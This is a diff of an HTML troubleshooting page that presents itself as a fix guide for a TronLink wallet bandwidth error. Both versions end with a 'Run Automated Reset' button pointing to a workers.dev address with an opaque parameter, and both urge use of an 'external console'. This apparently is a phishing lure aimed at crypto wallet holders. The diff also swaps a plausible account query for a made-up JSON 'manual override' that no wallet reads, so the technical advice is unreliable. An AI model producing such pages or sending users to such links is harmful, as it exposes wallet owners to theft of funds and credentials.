@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -46,34 +46,32 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contract functions.</li>
+<li>The error occurs due to insufficient bandwidth, which is required for transaction processing on the TRON network. Bandwidth is a resource that determines how many transactions a user can perform within a certain time frame.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Adjust the transaction parameters to reduce the bandwidth consumption.</li>
-<li>Use the following JSON-RPC method to check the account's bandwidth:</li>
+<li>Increase the bandwidth by freezing TRX tokens, which allocates more bandwidth for transaction processing.</li>
+<li>Adjust the transaction parameters to optimize bandwidth usage, such as reducing the number of transactions or using more efficient smart contract functions.</li>
+<li>Utilize the following JSON configuration to manually override bandwidth settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_tron_address&quot;</span>
+<span class="w">  </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;freeze&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and transaction handling.</p>
+<p>Consider utilizing an external console for more advanced configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON account with sufficient TRX balance</li>
-<li>TronLink wallet extension installed and configured</li>
-<li>Basic understanding of TRON network and transaction mechanics</li>
+<li>TRX tokens available for freezing</li>
+<li>Basic understanding of TRON network transaction processing</li>
+<li>TronLink wallet setup and configuration</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
